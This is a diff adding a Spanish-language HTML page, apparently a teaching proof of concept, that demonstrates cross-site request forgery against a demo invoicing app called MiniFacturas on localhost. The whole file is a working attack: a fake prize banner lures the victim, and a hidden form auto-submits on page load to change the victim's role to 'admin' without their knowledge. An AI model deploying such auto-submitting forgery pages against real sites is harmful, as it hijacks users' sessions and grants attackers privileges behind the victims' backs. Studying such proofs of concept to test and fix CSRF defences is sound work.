@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><title>Página maliciosa (PoC CSRF)</title></head>
+<body>
+  <h1>¡Felicidades, ganaste un premio!</h1>
+  <p>Esta página simula un sitio externo controlado por un atacante.
+  Si una víctima con sesión activa en MiniFacturas (http://localhost:3000) la visita,
+  el formulario se autoenvía y cambia su rol a "admin" sin que la víctima se entere.</p>
+
+  <!-- El formulario apunta al servidor VÍCTIMA, no a este dominio -->
+  <form id="csrfForm" action="http://localhost:3000/api/profile-form" method="POST">
+    <input type="hidden" name="role" value="admin">
+  </form>
+
+  <script>
+    // Se autoenvía apenas carga la página, sin interacción del usuario
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
